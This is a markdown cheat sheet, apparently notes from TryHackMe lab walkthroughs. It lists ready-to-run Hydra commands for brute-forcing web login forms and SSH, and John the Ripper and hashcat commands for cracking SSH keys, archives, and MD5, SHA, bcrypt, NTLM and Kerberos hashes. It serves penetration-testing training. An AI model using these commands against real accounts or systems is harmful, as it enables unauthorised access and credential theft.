# Brute force  & Cracking

## Analyzing Hashes

### Websites

**Hash Analyzer:** [https://www.tunnelsup.com/hash-analyzer/](https://www.tunnelsup.com/hash-analyzer/)

### Hash ID

Great tool that the room provides, use it to identify the hash type when John can't identify the hash by itself.

```
wget https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py
python3 hash-id.py $HASH
```



## Web

### Crack a simple web login

#### Examples

[hydra.md](../../walkthroughs/tryhackme/hydra.md "mention")

**Kali**

```
hydra -l $USERNAME -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top10000.txt 10.10.132.200 http-post-form "/login/:username=^USER^&password=^PASS^:F=incorrect" -V
```

### **Crafting request for Hydra**

#### Examples

[hackpark.md](../../walkthroughs/tryhackme/hackpark.md "mention")

**Kali**

```
hydra -l $USERNAME -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top10000.txt 10.10.110.93 http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=vvTqZ%2FG4tEKhQoxeTpJ%2FyGxM9ZY9ZIvd6YMUS%2BoY3uaQCjC%2BJRdlkd8rbIQsDHztL%2BjsAvOLJhxU7vTNo3GP%2FLEmsndGPNAlCDn%2FB%2FrK2ynp9QkhRe9iqKBUmM5FQT2kX%2Bg%2BfPDNnTuzqW5IlmTujw4sLEzbvvec9FDW4cbQevgTj1tHnKx0vMmkVah5imro0o%2BHvQ5%2FGvpafEs1NdnW6wrSsUFuXnYzletKCdLG%2FgSb7bCDOK4ukZK%2F1cMOgYtjOCU4gk4M7PhQcYZmGpAN7pPVCMpX2YwGnTSgBPPmCB6avoLqG5jRS%2F3PYMjsqEGcD9P9S555GMQPxtfyvOEaJw%2B%2BZELKU2yVYr4uWxamEITsWNAT&__EVENTVALIDATION=Tp%2B5DS80H3PFB8ipJ24uKyHkPhSkqKD7GFJlc2U6IaO61l68aholdIjrZJ%2FsotSi0QxRBQjayWovmb2SU%2Fk6lY%2BOpju62jOGDkAvqcdNsqGrgf3vrAYw88XT2ONABFvDTR771I2YAr7JylJ0HbBZV83nGvvXWSC6rmKDGn80%2FuszTjDZ&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:F=Login failed" -V
```



## **SSH**

### Brute force SSH

#### Examples

[hydra.md](../../walkthroughs/tryhackme/hydra.md "mention")

**Kali**

```
hydra -l $USERNAME -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top10000.txt $VICTIM -t 4 ssh
```

### Cracking SSH Keys

#### Examples

[john-the-ripper.md](../../walkthroughs/tryhackme/john-the-ripper.md "mention")

**Kali**

```
/opt/john/ssh2john.py idrsa.id_rsa > id_john.txt
john --wordlist=/usr/share/wordlists/rockyou.txt id_john.txt 
```



## Protected Zip Files

#### Examples

[john-the-ripper.md](../../walkthroughs/tryhackme/john-the-ripper.md "mention")

**Kali**

```
zip2john secure.zip > secure_john.txt
john --wordlist=/usr/share/wordlists/rockyou.txt secure_john.txt 
```

### Protected RAR Archives

#### Examples

[john-the-ripper.md](../../walkthroughs/tryhackme/john-the-ripper.md "mention")

**Kali**

```
/opt/john/rar2john secure.rar > secure_john.txt
john --wordlist=/usr/share/wordlists/rockyou.txt secure_john.txt
```





## Hashes

### Crack MD5 hash

#### Examples

[john-the-ripper.md](../../walkthroughs/tryhackme/john-the-ripper.md "mention")

**Kali**

```
john --format=raw-md5 hash.txt 
```

### Crack SHA-1 hash

#### Examples

[john-the-ripper.md](../../walkthroughs/tryhackme/john-the-ripper.md "mention")

**Kali**

```
john --format=raw-sha1 hash.txt
```

### Crack SHA-256

#### Examples

[game-zone.md](../../walkthroughs/tryhackme/game-zone.md "mention") [john-the-ripper.md](../../walkthroughs/tryhackme/john-the-ripper.md "mention")

**Kali**

```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=RAW-SHA256
```

### Crack SHA-512

#### Examples

[overpass-2-hacked.md](../../walkthroughs/tryhackme/overpass-2-hacked.md "mention")[john-the-ripper.md](../../walkthroughs/tryhackme/john-the-ripper.md "mention")

**Kali**

```
john --format=raw-sha512 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
```

**Kali**

```
hashcat -m 1710 -w /usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1710 hash.txt --show
```



### Crack BCrypt

#### Examples

[daily-bugle.md](../../walkthroughs/tryhackme/daily-bugle.md "mention")

**Kali**

```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
```



### Crack Whirlpool

#### Examples

[john-the-ripper.md](../../walkthroughs/tryhackme/john-the-ripper.md "mention")

**Kali**

```
john --format=whirlpool hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
```



### Crack NT hash

#### Examples

[blue.md](../../walkthroughs/tryhackme/blue.md "mention")

**Kali**

```
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

### Crack NTLM

#### Examples

[john-the-ripper.md](../../walkthroughs/tryhackme/john-the-ripper.md "mention")[post-exploitation-basics.md](../../walkthroughs/tryhackme/post-exploitation-basics.md "mention")

**Kali**

```
john --format=nt ntlm.txt --wordlist=/usr/share/wordlists/rockyou.txt 
```

**Kali**

```
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt --show
```

### Crack Kerberos 5, etype 23, TGS-REP

#### Examples

[attacking-kerberos-1.md](../../walkthroughs/tryhackme/attacking-kerberos-1.md "mention")



**Kali**

```
hashcat -m 13100 -a 0 hash.txt Pass.txt
hashcat -m 13100 -a 0 hash.txt Pass.txt --show
```

### Crack Kerberos 5, etype 23, AS-REP

#### Examples

[attacking-kerberos-1.md](../../walkthroughs/tryhackme/attacking-kerberos-1.md "mention")

**Kali**

```
hashcat -m 18200 hash.txt Pass.txt
hashcat -m 18200 hash.txt Pass.txt --show
```





